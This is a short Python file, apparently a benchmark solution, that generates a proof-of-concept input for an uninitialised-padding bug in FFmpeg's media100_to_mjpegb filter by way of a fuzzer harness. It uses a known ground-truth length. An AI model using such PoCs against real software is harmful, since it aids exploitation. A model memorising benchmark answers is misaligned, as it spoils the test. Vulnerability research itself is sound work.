import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in bsf/media100_to_mjpegb.
        
        The vulnerability is an uninitialized value issue due to uncleared padding 
        in the output buffer of the media100_to_mjpegb bitstream filter.
        
        The PoC targets the FFmpeg BSF fuzzer harness which expects:
        [4 bytes length of BSF name][BSF name][Packet data]
        """
        
        bsf_name = b"media100_to_mjpegb"
        
        # The fuzzer expects the length of the BSF name as a 32-bit little-endian integer,
        # followed by the name itself.
        header = struct.pack('<I', len(bsf_name)) + bsf_name
        
        # The ground truth PoC length is 1025 bytes.
        # Header length = 4 (len) + 18 (name) = 22 bytes.
        # Remaining bytes for payload = 1025 - 22 = 1003 bytes.
        # We fill the payload with zeros to simulate a Media 100 packet that passes 
        # minimal parsing checks and triggers the output allocation path.
        payload = b'\x00' * 1003
        
        return header + payload
